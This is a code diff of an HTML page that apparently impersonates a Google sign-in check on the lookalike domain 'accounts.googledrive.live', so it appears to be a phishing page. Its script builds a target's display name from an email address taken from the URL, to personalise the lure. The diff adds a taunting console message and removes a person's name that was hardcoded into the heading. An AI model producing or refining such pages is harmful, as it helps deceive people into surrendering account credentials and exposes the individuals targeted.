@@ -2,7 +2,7 @@
   <head>
     <script>
       window.onload = function() {
-          
+          console.log('What are you looking for..?')
         function getAllURLParams() {
           const urlParams = new URLSearchParams(window.location.search);
           let paramsObj = {};
@@ -13,6 +13,7 @@
         }
 
         function constructNameFromEmail(email) {
+      
           let namePart = email.split('@')[0];
           let names = namePart.split('.');
           let formattedName = names.map(name => name.charAt(0).toUpperCase() + name.slice(1)).join(' ');
@@ -18192,7 +18193,7 @@
                 <div jsname="paFcre">
                   <div class="rQszV " jsname="tJHJj" jscontroller="UPKV3d" jsaction="bTyaEe:pKJJqe(af8ijd);">
                     <h1 class="oO8pQe" data-a11y-title-piece="" id="headingText" jsname="r4nke">
-                      <span jsslot="" id="display_name">Shashi Ravula</span>
+                      <span jsslot="" id="display_name"></span>
                     </h1>
                     <div class="tosRNd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob">
                       <span jsslot="">Google wants to make sure that its really you trying to access accounts.googledrive.live</span>
